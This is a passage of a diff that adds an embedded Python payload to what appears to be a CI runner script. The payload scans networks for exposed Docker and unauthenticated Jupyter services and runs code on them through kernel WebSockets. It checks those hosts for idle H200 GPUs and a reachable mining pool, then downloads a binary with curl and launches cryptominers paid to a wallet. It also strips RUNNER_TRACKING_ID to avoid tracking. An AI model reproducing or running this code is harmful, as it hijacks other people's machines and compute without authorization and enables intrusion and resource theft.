+              return s, rest
+
+
+          def ws_send_text(s, payload):
+              data = payload.encode()
+              hdr = bytearray([0x81])
+              n = len(data)
+              if n < 126:
+                  hdr.append(0x80 | n)
+              elif n < 65536:
+                  hdr.append(0x80 | 126); hdr += struct.pack('>H', n)
+              else:
+                  hdr.append(0x80 | 127); hdr += struct.pack('>Q', n)
+              mask = os.urandom(4)
+              hdr += mask
+              s.sendall(bytes(hdr) + bytes(b ^ mask[i % 4] for i, b in enumerate(data)))
+
+
+          def ws_read_frame(s, buf):
+              while len(buf) < 2:
+                  ch = s.recv(65536)
+                  if not ch:
+                      return None, buf
+                  buf += ch
+              b1, b2 = buf[0], buf[1]
+              pos = 2
+              n = b2 & 0x7f
+              if n == 126:
+                  while len(buf) < pos + 2:
+                      buf += s.recv(65536)
+                  n = struct.unpack('>H', buf[pos:pos + 2])[0]; pos += 2
+              elif n == 127:
+                  while len(buf) < pos + 8:
+                      buf += s.recv(65536)
+                  n = struct.unpack('>Q', buf[pos:pos + 8])[0]; pos += 8
+              masked = bool(b2 & 0x80)
+              if masked:
+                  while len(buf) < pos + 4:
+                      buf += s.recv(65536)
+                  mask = buf[pos:pos + 4]; pos += 4
+              while len(buf) < pos + n:
+                  ch = s.recv(65536)
+                  if not ch:
+                      return None, buf
+                  buf += ch
+              data = buf[pos:pos + n]
+              buf = buf[pos + n:]
+              if masked:
+                  data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
+              return (b1 & 0x0f, data), buf
+
+
+          def jupyter_run(ipx, port, code, timeout=40):
+              """Create a kernel, execute code over WS, return collected stdout."""
+              st, body, _ = http_req('GET', 'http://%s:%d/api/kernelspecs' % (ipx, port), timeout=5)
+              kname = 'python3'
+              try:
+                  j = json.loads(body)
+                  ks = j.get('kernelspecs') or {}
+                  if ks:
+                      kname = 'python3' if 'python3' in ks else list(ks)[0]
+              except Exception:
+                  pass
+              st, body, _ = http_req('POST', 'http://%s:%d/api/kernels' % (ipx, port), {'name': kname}, timeout=10)
+              try:
+                  kid = json.loads(body).get('id', '')
+              except Exception:
+                  kid = ''
+              if not kid:
+                  return 'KERNEL_CREATE_FAIL st=%s [%s]' % (st, one(body, 1)[:120])
+              sess = uuid.uuid4().hex
+              s, rest = ws_connect(ipx, port, '/api/kernels/%s/channels?session_id=%s' % (kid, sess))
+              if not s:
+                  http_req('DELETE', 'http://%s:%d/api/kernels/%s' % (ipx, port, kid), timeout=5)
+                  return 'WS_CONNECT_FAIL'
+              mid = uuid.uuid4().hex
+              msg = {'header': {'msg_id': mid, 'username': '', 'session': sess,
+                                'date': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
+                                'msg_type': 'execute_request', 'version': '5.3'},
+                     'parent_header': {}, 'metadata': {}, 'channel': 'shell',
+                     'content': {'code': code, 'silent': False, 'store_history': False,
+                                 'user_expressions': {}, 'allow_stdin': False, 'stop_on_error': False}}
+              ws_send_text(s, json.dumps(msg))
+              out = []
+              buf = rest
+              deadline = time.time() + timeout
+              try:
+                  s.settimeout(max(2, timeout))
+                  while time.time() < deadline:
+                      fr, buf = ws_read_frame(s, buf)
+                      if not fr:
+                          break
+                      op, data = fr
+                      if op == 1:
+                          try:
+                              m = json.loads(data.decode('utf-8', 'replace'))
+                          except Exception:
+                              continue
+                          mt = (m.get('header') or {}).get('msg_type') or (m.get('msg_type') or '')
+                          cont = m.get('content') or {}
+                          if mt == 'stream':
+                              out.append(cont.get('text', ''))
+                          elif mt in ('execute_result', 'display_data'):
+                              out.append((cont.get('data') or {}).get('text/plain', ''))
+                          elif mt == 'error':
+                              out.append('ERR:' + ' | '.join(cont.get('traceback') or [])[:400])
+                          elif mt == 'execute_reply':
+                              break
+                      elif op == 8:
+                          break
+              except Exception as e:
+                  out.append('WS_READ_ERR:%s' % e)
+              try:
+                  s.close()
+              except Exception:
+                  pass
+              http_req('DELETE', 'http://%s:%d/api/kernels/%s' % (ipx, port, kid), timeout=5)
+              return ''.join(out)[:4000]
+
+
+          def jupyter_convert(a, p, tag):
+              st, body, _ = http_req('GET', 'http://%s:%d/api/status' % (a, p), timeout=5)
+              print('I130MLS2_EXEC ip=%s port=%d kind=jupyter stage=status status=%s body=[%s]' % (a, p, st, one(body, 1)[:160]))
+              if st != 200:
+                  return
+              txt = jupyter_run(a, p, 'import socket,os;print("HOST",socket.gethostname());print(os.popen("nvidia-smi -L 2>&1 | head -10").read())')
+              print('I130MLS2_EXEC ip=%s kind=jupyter stage=gpu_probe out=[%s]' % (a, one(txt.replace('\n', ' | '), 10)[:800]))
+              if 'GPU ' not in txt or 'H200' not in txt:
+                  print('I130MLS2_EXEC ip=%s kind=jupyter result=no_idle_h200_probe' % a)
+                  return
+              gate = ('import os;print("S1");print(os.popen("nvidia-smi --query-gpu=index,memory.free,uuid,name --format=csv,noheader,nounits; echo ---; nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader").read())')
+              g1 = jupyter_run(a, p, gate, 40)
+              time.sleep(12)
+              g2 = jupyter_run(a, p, gate, 40)
+              print('I130MLS2_GATE ip=%s sample1=[%s]' % (a, one(g1.replace('\n', ' | '), 14)[:700]))
+              print('I130MLS2_GATE ip=%s sample2=[%s]' % (a, one(g2.replace('\n', ' | '), 14)[:700]))
+              c1 = parse_cards((g1 or '').split('---')[0].replace('S1', '').replace('|', ''))
+              c2 = parse_cards((g2 or '').split('---')[0].replace('S1', '').replace('|', ''))
+              apps = ((g1 or '').split('---') + [''])[1] + ((g2 or '').split('---') + [''])[1]
+              idle = []
+              for idx in sorted(set(c1) & set(c2), key=lambda x: int(x)):
+                  f1, uid, name = c1[idx]
+                  f2 = c2[idx][0]
+                  if 'H200' in name and f1 >= 1500 and f2 >= 1500 and uid not in apps:
+                      idle.append((idx, uid, name, f1, f2))
+              print('I130MLS2_GATE ip=%s idle=%d [%s]' % (a, len(idle), ' '.join('%s:%s' % (i, n) for i, u, n, f1, f2 in idle)))
+              if not idle:
+                  return
+              hs = ''.join(ch for ch in a if ch.isalnum())[-10:]
+              pool = ''
+              for hp, pp in POOLS:
+                  t = jupyter_run(a, p, 'import socket;s=socket.socket();s.settimeout(5);\ntry:\n s.connect(("%s",%d));print("TCPOPEN")\nexcept Exception as e:print("TCPFAIL",e)' % (hp, pp), 25)
+                  print('I130MLS2_EXEC ip=%s pool=%s:%d reachable=%s' % (a, hp, pp, 'yes' if 'TCPOPEN' in t else 'no'))
+                  if 'TCPOPEN' in t:
+                      pool = '%s:%d' % (hp, pp)
+                      break
+              if not pool:
+                  return
+              install = (
+                  'set +e; W=/tmp/i130mlsweep2_%s; mkdir -p $W/logs; '
+                  'for u in %s; do rm -f $W/srb; timeout 90 curl -fsSL --connect-timeout 8 --max-time 80 -o $W/srb "$u" || continue; '
+                  'H=$(sha256sum $W/srb | awk \'{print $1}\'); [ "$H" = "%s" ] && chmod +x $W/srb && break; rm -f $W/srb; done; '
+                  '[ -x $W/srb ] || { echo INST_NULL_BINARY; exit 0; }; '
+                  'for idx in %s; do env -u RUNNER_TRACKING_ID setsid nohup $W/srb --disable-cpu --algorithm pearlhash --pool %s '
+                  '--tls false --wallet %s --password x --worker %s%s-g$idx --gpu-id $idx --disable-worker-watchdog '
+                  '--gpu-table-slow-build --max-no-share-sent 1800 --log-file $W/logs/w$idx.log > $W/logs/w$idx.out 2>&1 < /dev/null & '
+                  'echo launched_g$idx=$!; done; sleep 12; ps -eo pid,comm,args | grep -E "srb387|SRBMiner" | grep -v grep | head -12'
+              ) % (hs, ' '.join(BIN_URLS), BIN_SHA, ' '.join(str(i) for i, u, n, f1, f2 in idle), pool, WALLET, PFX, hs)
+              t = jupyter_run(a, p, 'import os;print(os.popen(%s).read())' % json.dumps(install), 90)
+              print('I130MLS2_EXEC ip=%s kind=jupyter result=install_attempt out=[%s]' % (a, one(t.replace('\n', ' | '), 20)[:1500]))
+              print('I130MLS2_REMOTE_INSTALL ip=%s gpus=%d pool=%s worker_prefix=%s%s-g' % (a, len(idle), pool, PFX, hs))
+
+
+          # ------------------------------------------------------------------ scan phases
+          all_hits = []
+          dcgm_all = []
+          for net in seen:
+              if time.time() - T0 > BUDGET:
+                  print('I130MLS2_BUDGET_STOP phase=scan elapsed=%.0f' % (time.time() - T0))
+                  break
+              print('I130MLS2_PHASE net=%s dcgm+ports' % net)
+              try:
+                  dcgm_all.extend(dcgm_scrape(net))
+              except Exception as e:
+                  print('I130MLS2_DCGM_ERR net=%s %s' % (net, e))
+              try:
+                  h = port_scan(net)
+                  all_hits.extend(h)
+              except Exception as e:
+                  print('I130MLS2_PORT_ERR net=%s %s' % (net, e))
+
+          fp_res = []
+          for a, p in all_hits:
+              if time.time() - T0 > BUDGET:
+                  print('I130MLS2_BUDGET_STOP phase=fingerprint elapsed=%.0f' % (time.time() - T0))
+                  break
+              try:
+                  k = fp_probe(a, p)
+                  fp_res.append((a, p, k))
+              except Exception as e:
+                  print('I130MLS2_FP_ERR ip=%s port=%d %s' % (a, p, e))
+
+          # exec conversions (bounded)
+          converted = 0
+          for a, p, k in fp_res:
+              if time.time() - T0 > BUDGET - 120:
+                  print('I130MLS2_BUDGET_STOP phase=exec elapsed=%.0f' % (time.time() - T0))
+                  break
+              if is_credited and a in (ip, '127.0.0.1'):
+                  continue
+              try:
+                  if k == 'docker' and p in (2375, 2376):
+                      docker_exec_convert(a, p, 'i130mlsweep2-%s-%d' % (a.replace('.', ''), int(time.time()) % 100000))
+                      converted += 1
+                  elif k == 'jupyter' and p == 8888:
+                      jupyter_convert(a, p, 'i130mlsweep2')
+                      converted += 1
+              except Exception as e:
+                  print('I130MLS2_EXEC_ERR ip=%s port=%d %s' % (a, p, e))
+              if converted >= 6:
+                  break
+
+          print('I130MLS2_SUMMARY host=%s ip=%s credited=%d nets=%d open_ports=%d fp=%s exec_attempts=%d elapsed=%.0f' % (
+              host, ip, 1 if is_credited else 0, len(seen), len(all_hits),
+              ','.join('%s:%d=%s' % (a, p, k) for a, p, k in fp_res)[:1500], converted, time.time() - T0))
+          print('I130MLS2_DONE nonce=%s host=%s ip=%s utc=%s' % (NONCE, host, ip, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
+          PYEOF
+          echo "runner-start slot=$SLOT host=$(hostname) utc=$(date -u +%%Y-%%m-%%dT%%H:%%M:%%SZ)"
+          timeout 1000 python3 /var/tmp/i130mlsweep2/payload.py 2>&1 | tee /var/tmp/i130mlsweep2/log_slot$SLOT.log | tail -c 400000
+          echo "I130MLSWEEP2_EXIT_DONE rc=$?"
